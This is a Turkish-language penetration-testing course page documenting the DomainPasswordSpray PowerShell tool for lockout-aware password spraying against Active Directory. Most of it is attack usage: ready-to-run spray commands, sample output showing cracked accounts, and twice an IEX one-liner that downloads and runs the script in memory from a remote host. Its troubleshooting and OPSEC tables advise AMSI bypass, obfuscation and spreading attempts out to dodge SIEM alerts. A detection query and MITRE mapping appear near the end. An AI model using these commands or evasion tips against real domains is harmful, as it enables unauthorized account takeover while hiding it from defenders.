# DomainPasswordSpray

> **Kategori:** [3. DİZİN KEŞFİ, GRAF ANALİZİ VE SALDIRI YOLU HARİTALAMA (RECON & BLOODHOUND)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Brandon Colley (DaftHack) tarafından geliştirilen; Active Directory etki alanı kilitleme politikasını (Account Lockout Policy) önceden sorgulayarak kullanıcı hesaplarını kilitlemeyecek güvenli aralıklarla parola püskürtmesi (Password Spraying) yapan PowerShell aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında kaba kuvvet (Brute Force) saldırıları, aynı kullanıcı hesabına arka arkaya farklı parolalar denenmesi mantığına dayanır. Ancak kurumsal ağların neredeyse tamamında tanımlı olan **Hesap Kilitleme Politikası (Account Lockout Threshold)** nedeniyle bu saldırılar 3 ila 5 denemeden sonra hedef hesabı kilitler, kurban kullanıcının çalışmasını engeller ve SOC ekiplerinin paneline kritik alarmlar düşürür.

**DomainPasswordSpray** (`Invoke-DomainPasswordSpray`), bu kilitlenme tuzağını aşmak amacıyla geliştirilmiş akıllı bir parola püskürtme (Password Spraying) aracıdır. Aracın çalışma mantığı tek bir kullanıcıya birden çok parola denemek yerine; **etki alanındaki tüm kullanıcılara aynı anda tek bir parola (örneğin `Sonbahar2026!`) denemektir**. Böylece her kullanıcı için yalnızca 1 başarısız oturum açma denemesi oluşur ve hesap kilitleme eşiği aşılmaz.

Araç çalıştırıldığında ilk olarak etki alanı denetleyicisine bağlanarak kilitlenme eşiğini (`LockoutThreshold`) ve kilitlenme sıfırlama penceresini (`LockoutObservationWindow`) otomatik olarak öğrenir. Eğer birden fazla parola içeren bir liste verilmişse, iki parola püskürtme turu arasında kilitlenme penceresi kadar (örneğin 30 dakika) otomatik uykuya (`Sleep`) dalarak sıfır kilitlenme riskiyle testi sürdürür.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                        DOMAINPASSWORDSPRAY ÇALIŞMA MİMARİSİ                       |
+-----------------------------------------------------------------------------------+
                                          |
                      [Operatör / PowerShell Oturumu]
                 Invoke-DomainPasswordSpray -Password 'Mevsim2026!'
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                  1. Adım: Etki Alanı Politikasının Sorgulanması                   |
|     (LDAP / ADSI ile LockoutThreshold ve LockoutObservationWindow Okunur)         |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                  2. Adım: Aktif Kullanıcı Listesinin Çıkarılması                  |
|     - Devre dışı (Disabled) ve Kilitli (Locked) hesaplar elenir.                  |
|     - badPwdCount değeri kilitlenme eşiğine yakın olan hesaplar korunur.          |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                  3. Adım: Güvenli Parola Püskürtme Döngüsü                        |
|  Kullanıcı 1  ---> [Mevsim2026!] ---> Başarısız (badPwdCount: 1)                  |
|  Kullanıcı 2  ---> [Mevsim2026!] ---> BAŞARILI! (Giriş Yapıldı)                   |
|  Kullanıcı 3  ---> [Mevsim2026!] ---> Başarısız (badPwdCount: 1)                  |
|  ...                                                                              |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                  4. Adım: Çoklu Parola Varsa Akıllı Bekleme                       |
|   (Kilitlenme Penceresi: 30 Dakika Uyunur -> badPwdCount Sayaçları Sıfırlanır)     |
|                   -> Yeni Parola ile 2. Tur Başlatılır                            |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                           Başarılı Kimlik Bilgileri                               |
|        Ekrana Yeşil Vurgulama & Diske Kayıt (-OutFile successful_logins.txt)      |
+-----------------------------------------------------------------------------------+
```

### Neden Önemli?

| Yetenek | Operasyonel Değer | Sızma Testi Avantajı |
|---|---|---|
| **Otomatik Kilitlenme Koruması** | Etki alanı kilitlenme eşiğini otomatik okur. | Hesapları kilitleyip iş kesintisine yol açma riskini tamamen ortadan kaldırır. |
| **badPwdCount Denetimi** | Zaten hatalı giriş yapılmış sınır hesapları atlar. | Başka sebeplerle şifresi hatalı girilmiş personeli kilitlemez. |
| **UserAsPassword Testi** | Parolası kullanıcı adıyla aynı olan hesapları dener. | Kullanıcı adı `ahmet` olup parolası `ahmet` olan zayıf hesapları anında yakalar. |
| **Hafif ve Kurulumsun** | Tek bir `.ps1` fonksiyonudur. | Belleğe yüklenerek (IEX) diske yazılmadan uzaktan çalıştırılabilir. |

### 1.1 Active Directory Parola Kilitleme Mimarisi ve Hesap Güvenliği Parametreleri

DomainPasswordSpray, güvenli püskürtme yapabilmek için arka planda aşağıdaki Active Directory etki alanı ve kullanıcı özniteliklerini analiz eder:

| Politika / Öznitelik | LDAP Karşılığı | Anlamı ve Püskürtmedeki Rolü |
|---|---|---|
| **Lockout Threshold** | `lockoutThreshold` | Bir hesabın kilitlenmesi için gereken ardışık hatalı parola deneme sayısı (Örn: 5). |
| **Observation Window** | `lockoutObservationWindow` | Hatalı parola sayacının (`badPwdCount`) sıfırlanması için geçmesi gereken süre (Örn: 30 dk). |
| **Lockout Duration** | `lockoutDuration` | Kilitlenen bir hesabın otomatik olarak açılması için bekleme süresi. |
| **Hatalı Deneme Sayacı**| `badPwdCount` | Kullanıcının son başarılı oturumundan bu yana kaç kez yanlış parola girdiği. |
| **Son Hata Zamanı** | `badPasswordTime` | En son ne zaman hatalı parola denendiği (UTC zaman damgası). |
| **Son Başarılı Giriş** | `lastLogonTimestamp` | Hesabın aktif olarak kullanılıp kullanılmadığını belirleme. |

### Alternatif Araçlarla Karşılaştırma

| Kriter | DomainPasswordSpray | Kerbrute | Spray-Passwords | NetExec (nxc) | Rubeus (spray) |
|---|---|---|---|---|---|
| **Platform** | Windows (PowerShell) | Linux/Win (Go) | Windows (PowerShell) | Linux (Python) | Windows (.NET) |
| **Kilitlenme Algılama**| **Tam Otomatik** | Manuel (`--safe`) | Manuel | Manuel | Manuel |
| **Akıllı Bekleme (Sleep)**| **Var (Pencere Boyunca)**| Yok | Kısmi | Yok | Yok |
| **UserAsPassword** | **Var (`-UserAsPassword`)**| Yok | Yok | Var | Yok |
| **Kullanılan Protokol**| Win32 / ADSI / RPC | Kerberos AS-REQ | Win32 Logon | SMB / Kerberos | Kerberos |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

DomainPasswordSpray modülü içe aktarıldıktan sonra `Invoke-DomainPasswordSpray` fonksiyonu ile çağrılır:

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray [parametreler]
```

### 2.1 Temel Çalıştırma Parametreleri

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-Password` | Püskürtülecek tek bir parola dizisi. | `-Password "Kış2026!"` |
| `-PasswordList` | Sırayla püskürtülecek parolaların bulunduğu metin dosyası. | `-PasswordList .\passwords.txt` |
| `-UserList` | Dizin yerine dışarıdan sağlanan kullanıcı listesi dizisi veya dosyası. | `-UserList .\users.txt` |
| `-UserAsPassword` | Her kullanıcının parolasını kendi kullanıcı adı olarak test eder. | *(Anahtar bayrak)* |
| `-Domain` | Sorgulanacak hedef etki alanı adı. | `-Domain "corp.local"` |
| `-Server` | Sorguların gönderileceği belirli bir Etki Alanı Denetleyicisi. | `-Server "10.10.10.10"` |
| `-OutFile` | Başarılı girişlerin kaydedileceği çıktı metin dosyası. | `-OutFile "valid_creds.txt"` |

### 2.2 Güvenlik ve Eşik Parametreleri

| Parametre | Açıklama | Varsayılan Değer |
|---|---|---|
| `-Sleep` | Püskürtme turları arasında beklenecek süre (dakika cinsinden). | `LockoutObservationWindow` |
| `-MaxPercentBadLogins` | Başarısız oturum yüzdesi bu eşiği aşarsa saldırıyı durdurur (Emniyet Freni).| `10` (%10) |
| `-Force` | Kilitlenme eşiği 0 veya çok düşükse onay sormadan zorla çalıştırır. | *(Anahtar bayrak)* |
| `-PassThru` | Başarılı nesneleri boru hattına (pipeline) PowerShell nesnesi olarak iletir. | *(Anahtar bayrak)* |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Tek Bir Parolayı Etki Alanı Genelinde Güvenle Püskürtme

Etki alanındaki tüm kullanıcılara mevsimlik bir parolayı kilitlenme riski olmadan deneme:

```powershell
# 1. Betiği belleğe yükleme
. .\DomainPasswordSpray.ps1

# 2. Güvenli püskürtmeyi başlatma
Invoke-DomainPasswordSpray -Password 'Sonbahar2026!' -OutFile 'C:\Temp\success.txt'
```

**Konsol Çıktısı Analizi:**

```text
[i] Domain Password Spray by @daftHack
[i] Getting domain policy...
[+] Lockout Threshold: 5
[+] Lockout Observation Window: 30 minutes
[+] Lockout Duration: 30 minutes
[i] Getting domain user list...
[+] Found 1,420 users in domain corp.local
[i] 12 users are disabled and will be skipped.
[i] 2 users are locked out and will be skipped.
[i] 3 users have badPwdCount >= 4 and will be skipped for safety!
[i] Ready to spray 1,403 users with password: Sonbahar2026!
[*] Starting spray...
[+] SUCCESS! User: corp.local\mehmet.ozdemir Password: Sonbahar2026!
[+] SUCCESS! User: corp.local\stajyer_ali Password: Sonbahar2026!
[i] Finished spraying 1,403 users. Found 2 valid credentials.
[+] Results written to: C:\Temp\success.txt
```
*Analiz: Araç önce etki alanı politikasını okumuş (Eşik: 5), kilitli veya eşiğe yakın 3 hesabı güvenlik için atlamış ve geriye kalan 1.403 kullanıcıya tek seferde parolayı deneyerek 2 adet geçerli oturum yakalamıştır.*

### Senaryo 2: Parolası Kullanıcı Adıyla Aynı Olan Hesapları Tespit Etme

Kullanıcı adı `test` olup parolası da `test` olan veya ilk oluşturulduğunda şifresi kullanıcı adı yapılan hesapları avlama:

```powershell
Invoke-DomainPasswordSpray -UserAsPassword -OutFile 'C:\Temp\user_as_pass.txt'
```

### Senaryo 3: Çoklu Parola Listesi ile Otomatik Kilitlenme Süresini Bekleme

Elindeki 3 adet yaygın parolayı (`Sirket2026!`, `Welcome123!`, `Password123`), aralarda 30 dakika bekleyerek sırayla deneme:

```powershell
Invoke-DomainPasswordSpray -PasswordList .\top3_passwords.txt -OutFile .\found_creds.txt
```
*İlk parola 1.400 kullanıcıya denenir. Tur bittiğinde araç 30 dakika uykuya dalar, etki alanındaki sayaçlar sıfırlanınca ikinci parolaya geçer.*

### Senaryo 4: Yalnızca Belirli Bir Kullanıcı Listesini Hedefleme

Önceden filtrelenmiş veya yetkili kullanıcılardan oluşan bir listeyi hedef alarak püskürtme:

```powershell
$target_users = Get-Content .\service_accounts.txt
Invoke-DomainPasswordSpray -UserList $target_users -Password 'Service2026!'
```

### Senaryo 5: Diske Dosya Yazmadan Bellek İçi (In-Memory) Uzaktan Çalıştırma

Kurban iş istasyonunun sabit diskine `.ps1` dosyası yazmadan C2 veya web üzerinden doğrudan çalıştırma:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Password 'Ilkbahar2026!'
```

### Senaryo 6: Fine-Grained Password Policy (FGPP) Bulunan Ortamlarda Püskürtme

Etki alanında bazı yetkili gruplara (örneğin Tier 1 Admins) farklı Password Settings Object (PSO) politikası atanmışsa, bu grupları ana püskürtmeden hariç tutma:

```powershell
# 1. Özel PSO politikası olan kullanıcıları listeleme
$pso_users = Get-ADUser -Filter * -Properties "msDS-ResultantPSO" | Where-Object { $_."msDS-ResultantPSO" -ne $null } | Select-Object -ExpandProperty SamAccountName

# 2. Standart kullanıcıları seçip PSO'lu hesapları hariç tutarak püskürtme
$standard_users = Get-ADUser -Filter * | Where-Object { $pso_users -notcontains $_.SamAccountName } | Select-Object -ExpandProperty SamAccountName
Invoke-DomainPasswordSpray -UserList $standard_users -Password 'Kurum2026!'
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Olası Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `[!] Lockout threshold is 0. Aborting spray to prevent accidental lockout` | Etki alanında kilitlenme eşiği ayarlanmamış veya sınırsız olarak görünüyor. | Araç tedbir amaçlı durur. Devam etmek için komuta `-Force` bayrağını ekleyerek denetimi atlayın. |
| `[!] Maximum bad logins percentage reached (10%). Aborting spray!` | Denenen parola ağ genelinde çok fazla başarısız giriş üretti; güvenlik freni devreye girdi. | Emniyet freni SOC alarmlarını önlemek içindir. Eşiği artırmak için `-MaxPercentBadLogins 20` kullanın veya parolayı değiştirin. |
| `This script contains malicious content and has been blocked by your antivirus software` | Windows Defender AMSI, `Invoke-DomainPasswordSpray` imzasını yakaladı. | Bellek içi AMSI bypass uygulayın, fonksiyon/değişken isimlerini karıştırın (obfuscation) veya Linux üzerinden `Kerbrute` kullanın. |
| `The term 'Invoke-DomainPasswordSpray' is not recognized...` | Betik dot-sourcing yöntemiyle içe aktarılmadı veya oturum kapandı. | Betiğin başına nokta ve boşluk koyarak yükleyin: `. .\DomainPasswordSpray.ps1`. |
| `System.DirectoryServices.DirectoryServicesCOMException: The server is not operational` | İstemci makine DC ile iletişim kuramıyor veya DNS çözümlenemedi. | `-Server <DC_IP>` bayrağı ile geçerli DC IP adresini elle belirtin. |
| `Cannot bind argument to parameter 'PasswordList' because it is empty` | Verilen parola dosyasının içi boş veya yol yanlış girildi. | Dosya yolunu kontrol edin (`Test-Path .\passwords.txt`). Dosyanın UTF-8 formatında olduğundan emin olun. |
| `Cannot create type in ConstrainedLanguage mode` | PowerShell ortamı AppLocker / WDAC kısıtlaması nedeniyle CLM modunda çalışıyor. | Unmanaged PowerShell runner kullanın ya da C# derlemesi olan `Spray-Passwords` veya Linux'tan `Kerbrute` çalıştırın. |
| `Multiple DCs out of sync: badPwdCount discrepancy` | Çoklu etki alanı denetleyicisi ortamında acil parola replikasyonu henüz tamamlanmamış. | Püskürtmeyi tek bir ana DC'ye yönlendirin (`-Server PDC_IP`) böylece sayaçlar tek merkezden doğru izlenir. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

Password Spraying saldırıları, tekil kullanıcı kilitlenmesini engellese de, **Etki Alanı Denetleyicisi seviyesinde toplu başarısız oturum açma istatistikleri üretir.**

### 5.1 Bırakılan İzler ve Log Kaynakları

1. **Windows Security Event ID 4625 (An account failed to log on):**
   - Püskürtülen parola yanlış olan her kullanıcı için DC üzerinde bir Event ID 4625 üretilir.
   - **Logon Type:** Tipik olarak **Logon Type 3 (Network)** veya **Logon Type 8 (NetworkCleartext)**.
   - **Sub-Status Code:** `0xC000006A` (Hatalı parola).
   - Tek bir kaynak iş istasyonundan dakikalar içerisinde yüzlerce farklı kullanıcı adına yapılan Type 3 başarısız oturumlar, SIEM'deki "Password Spraying Detection" korelasyon kurallarının bir numaralı tetikleyicisidir.
2. **Windows Security Event ID 4624 (Successful Logon):**
   - Parolası doğru çıkan kullanıcılar için başarılı oturum açma günlüğü oluşur.
3. **PowerShell Script Block Logging (Event ID 4104):**
   - `Invoke-DomainPasswordSpray` kod blokları `Microsoft-Windows-PowerShell/Operational` günlüğüne tam metin yazılır.

### 5.2 Ağ ve EDR İmzaları

- **Eşzamanlı RPC / SMB Trafiği:** Kısa bir zaman diliminde DC'ye yapılan yüzlerce ardışık kimlik doğrulama isteği.
- **Sysmon Event ID 1:** PowerShell komut satırında `-Password` argümanının açıkça görünmesi.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | DomainPasswordSpray Karşılığı |
|---|---|---|
| **T1110.003** | Brute Force: Password Spraying | Etki alanı genelinde tek parola deneme |
| **T1201** | Password Policy Discovery | `LockoutThreshold` politikasını sorgulama |
| **T1087.002** | Account Discovery: Domain Account | Aktif kullanıcı listesinin çekilmesi |
| **T1078.002** | Valid Accounts: Domain Accounts | Başarılı kimlik bilgisiyle etki alanı erişimi |

### 5.4 OPSEC Önerileri

| Risk | Tespit Sebebi | OPSEC Önlemi |
|---|---|---|
| **SIEM 4625 Korelasyonu** | 5 dakikada 1000 kullanıcının başarısız oturum üretmesi. | İstekleri zamana yayın; tüm şirketi tek seferde taramak yerine parçalı kullanıcı listeleri (`-UserList`) kullanın. |
| **Script Block Log (4104)** | EDR'ın `DomainPasswordSpray` string'ini yakalaması. | Fonksiyon adını değiştirin, değişkenleri şifreleyin veya `SharpView`/C# tabanlı araçlara geçin. |
| **CLI'da Açık Parola İzi** | `-Password 'Parola!'` argümanının process loglarına yazılması. | Parolayı komut satırına yazmak yerine `$cred = Read-Host -AsSecureString` ile bellekten dinamik verin. |

### 5.5 Savunma Karşılığı (Blue Team & Detection)

Parola püskürtme saldırısını tespit eden örnek Splunk / ELK korelasyon sorgusu:

```text
index=wineventlog EventCode=4625 Logon_Type=3 Sub_Status="0xc000006a"
| stats count dc(TargetUserName) as UniqueUsers by Source_Network_Address
| where UniqueUsers > 30 and count > 30
```
*Açıklama: Tek bir IP adresinden kısa sürede 30'dan fazla farklı kullanıcı adıyla başarısız oturum açılması (Event ID 4625, 0xC000006A) parola püskürtmenin kesin kanıtıdır.*

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```powershell
# 1. Tek Bir Parolayı Tüm Etki Alanına Püskürtme
Invoke-DomainPasswordSpray -Password 'Sonbahar2026!' -OutFile valid.txt
```
- **Ne Yapar?** Etki alanı politikasını kontrol eder, aktif tüm kullanıcılara belirtilen parolayı dener.
- **Ne Zaman Kullanılır?** Şirket genelinde mevsimlik veya varsayılan parolaları test ederken.
- **Parametreler:** `-Password` denenecek parola; `-OutFile` başarılı sonuç dosyası.

```powershell
# 2. Parolası Kullanıcı Adıyla Aynı Olan Hesapları Bulma
Invoke-DomainPasswordSpray -UserAsPassword -OutFile user_as_pass.txt
```
- **Ne Yapar?** Her kullanıcının parolasını kendi `sAMAccountName` değeriyle test eder.
- **Ne Zaman Kullanılır?** İlk erişim sonrası zayıf yapılandırılmış test ve servis hesaplarını yakalamak için.
- **Parametreler:** `-UserAsPassword` anahtar bayrağı.

```powershell
# 3. Çoklu Parola Listesi ile Kilitlenme Süresini Bekleyerek Çalıştırma
Invoke-DomainPasswordSpray -PasswordList .\wordlist.txt -OutFile results.txt
```
- **Ne Yapar?** Parolaları sırayla dener; her parola turu arasında kilitlenme penceresi (30 dk) kadar uyur.
- **Ne Zaman Kullanılır?** Genişletilmiş sözlük saldırılarında hesapları kilitlemeden gece boyunca test yaparken.
- **Parametreler:** `-PasswordList` parola listesi dosyası.

```powershell
# 4. Yalnızca Belirli Bir Kullanıcı Listesini Hedefleme
Invoke-DomainPasswordSpray -UserList (Get-Content .\targets.txt) -Password 'Welcome1!'
```
- **Ne Yapar?** Tüm etki alanını değil, yalnızca belirtilen kullanıcı grubunu hedefler.
- **Ne Zaman Kullanılır?** Hassas veya kritik servis hesaplarına odaklanırken ağ gürültüsünü düşürmek için.
- **Parametreler:** `-UserList` hedef kullanıcı dizisi.

```powershell
# 5. Kilitlenme Eşiği Olmayan veya 0 Olan Ortamlarda Zorla Çalıştırma (-Force)
Invoke-DomainPasswordSpray -Password 'Company2026!' -Force
```
- **Ne Yapar?** Politika kilitlenme eşiği bildirmese dahi güvenlik uyarısını atlayarak testi başlatır.
- **Ne Zaman Kullanılır?** Kilitlenme politikasının kapatıldığı test veya laboratuvar ortamlarında.
- **Parametreler:** `-Force` güvenlik onayını atlar.

```powershell
# 6. Belirli Bir Bekleme Süresi (Sleep) Tanımlama
Invoke-DomainPasswordSpray -PasswordList .\passes.txt -Sleep 45
```
- **Ne Yapar?** İki parola turu arasında varsayılan süre yerine 45 dakika bekler.
- **Ne Zaman Kullanılır?** Şirketin kilitlenme gözlem süresi standarttan uzun olduğunda.
- **Parametreler:** `-Sleep 45` dakika cinsinden bekleme süresi.

```powershell
# 7. Farklı Bir Etki Alanı ve Denetleyicisini Hedefleme
Invoke-DomainPasswordSpray -Domain "sub.corp.local" -Server "10.10.20.5" -Password 'Pass123'
```
- **Ne Yapar?** Mevcut makinenin bağlı olduğu etki alanı dışındaki hedef DC'ye püskürtme yapar.
- **Ne Zaman Kullanılır?** Çoklu etki alanı (multi-domain forest) sızma testlerinde.
- **Parametreler:** `-Domain` hedef etki alanı; `-Server` hedef DC IP'si.

```powershell
# 8. Başarısız Giriş Yüzdesi Frenini Özelleştirme
Invoke-DomainPasswordSpray -Password 'Secret2026!' -MaxPercentBadLogins 25
```
- **Ne Yapar?** Başarısız giriş oranı %25'e ulaşana kadar testi kesmez.
- **Ne Zaman Kullanılır?** Çok sayıda eski veya kullanılmayan hesabın bulunduğu ortamlarda testi sürdürmek için.
- **Parametreler:** `-MaxPercentBadLogins` emniyet freni yüzdesi.

```powershell
# 9. Başarılı Girişleri Doğrudan PowerShell Pipeline'ına Aktarma
Invoke-DomainPasswordSpray -Password 'Yaz2026!' -PassThru | ForEach-Object { $_.Username }
```
- **Ne Yapar?** Başarılı kullanıcı nesnelerini diğer PowerShell script'lerine doğrudan girdi olarak iletir.
- **Ne Zaman Kullanılır?** Otomasyon zincirlerinde başarılı hesapları anında BloodHound veya WMI'a aktarırken.
- **Parametreler:** `-PassThru` pipeline çıktısını etkinleştirir.

```powershell
# 10. Bellek İçi (Diske Yazmadan) Uzaktan İndirip Çalıştırma
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/spray.ps1'); Invoke-DomainPasswordSpray -Password 'Test2026!'
```
- **Ne Yapar?** Dosyayı diske kaydetmeden bellekten çalıştırır.
- **Ne Zaman Kullanılır?** C2 oturumlarında veya uç noktada dosya oluşturma izi bırakmak istenmediğinde.
- **Parametreler:** `IEX` bellek içi yürütme motoru.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [dafthack / DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
- **Brandon Colley Blogu:** [Password Spraying Active Directory - dafthack](https://medium.com/@dafthack)
- **Active Directory Account Lockout Policy:** [Microsoft Lockout Policy Architecture](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/account-lockout-policy)
- **MITRE ATT&CK Framework:** [Technique T1110.003 - Password Spraying](https://attack.mitre.org/techniques/T1110/003/)

---

> **Önceki:** [← Kerbrute](./Kerbrute.md) · **Sonraki:** [Spray-Passwords →](./Spray-Passwords.md)
